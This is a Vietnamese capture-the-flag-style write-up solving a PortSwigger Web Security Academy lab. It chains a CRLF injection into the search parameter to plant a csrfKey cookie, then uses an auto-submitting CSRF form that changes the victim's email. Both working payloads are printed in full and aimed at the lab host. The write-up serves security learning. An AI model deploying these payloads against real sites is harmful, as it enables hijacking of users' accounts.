![image](https://github.com/user-attachments/assets/7bfa8ba3-f573-4b21-a626-368cac64f6fa)

Đọc mô tả thì có thể thấy được rằng challenge 5 này nó khá giống với challenge 4. Nó khác ở cái là lần này nó liên quan đến session =))

![image](https://github.com/user-attachments/assets/383796cc-f505-4e19-9242-711fc04263df)

Tiến hành đổi thử email của user và xem request thì lần này ta có thể thấy nó có thêm `csrfKey`, tôi k biết cái này nó là gì nhưng nhìn tên và format thì có vẻ nó là csrf token nhưng là do 1 framework nào đó gen ra.

Tiến hành đăng nhập vào attacker và thay đổi lại 2 thông tin `csrfkey, csrf` xem sao.

![image](https://github.com/user-attachments/assets/d51d63cf-df57-407b-8be8-27a7b0713fb1)

![image](https://github.com/user-attachments/assets/e7635532-120f-48e3-ad79-e3da7f7f7919)

Đó là thông tin của attacker.

Tiến hành thay vào user.

![image](https://github.com/user-attachments/assets/b49d9615-9550-429d-98a2-b0635b600dae)

Ta đã thay vào rồi v:, xem thử nó có đổi ko nhé.

![image](https://github.com/user-attachments/assets/70613558-a27e-4cef-b543-c4fe293345bd)

Nó đã đổi v:v:.

Tiến hành gen ra poc thôi 

![image](https://github.com/user-attachments/assets/1b82f00e-cc16-4dd2-a9b5-22c3c36731ad)

Ủa vẫn sử dụng poc cũ nhưng tại sao ko thấy cookie v:, chợt nhận ra là cookie nó được trình duyệt quản lí và session nó được server quản lí v:, nên không thể thay đổi thông qua auto submit form bằng mấy cái tag value được.

=)), Hết cứu, vậy còn cách nào khác hay không? Tiến hành xem hết các chức năng của web này xem sao.

![image](https://github.com/user-attachments/assets/461d80e6-5b0a-45ff-8766-4cef331acf30)

Tiến hành test chức năng search thì phát hiện nó có lỗi `crlf injection`. Thì sơ qua lỗi này như sau:

CRLF Injection là một lỗ hổng bảo mật xảy ra khi kẻ tấn công chèn các ký tự Carriage Return (CR, \r) và Line Feed (LF, \n) vào dữ liệu đầu vào, gây ra việc phá vỡ cấu trúc của các tiêu đề HTTP hoặc log. Điều này có thể dẫn đến các cuộc tấn công như HTTP Response Splitting, Log Injection, hoặc XSS, bằng cách tạo ra phản hồi HTTP không mong muốn hoặc ghi dữ liệu sai lệch vào hệ thống.

Còn lại bạn muốn biết thêm thông tin thì cứ google nhé.

Đã biết được lỗi đó rồi thì giờ ta hãy nghĩ đến cách nào có thể thao túng được cookie nhỉ, XSS chứ còn ai trong khoai đất này nữa.

Vậy giờ ta hãy xây dựng 1 exploit chain mini `crlf injection -> xss -> csrf`

**crlf injection + xss**

```
<img src = "https://0aa6009604a830fc805a1c0200bd0055.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrfKey%3dYw7VbHYTaSBWVUKSnLZgFZOrgyIFOgp0;SameSite%3dNone;">
```

**csrf**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa6009604a830fc805a1c0200bd0055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="x2zy&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="q9OwBYvkVFzr7P1BXtYiXK0blihuf4fn" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
<img src = "https://0aa6009604a830fc805a1c0200bd0055.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrfKey%3dYw7VbHYTaSBWVUKSnLZgFZOrgyIFOgp0;SameSite%3dNone;">
  </body>
</html>
```

Vậy là thành công giải được challenge này rồi.

![image](https://github.com/user-attachments/assets/65b2d2c6-5b1f-4185-8c35-1395cd67d0a4)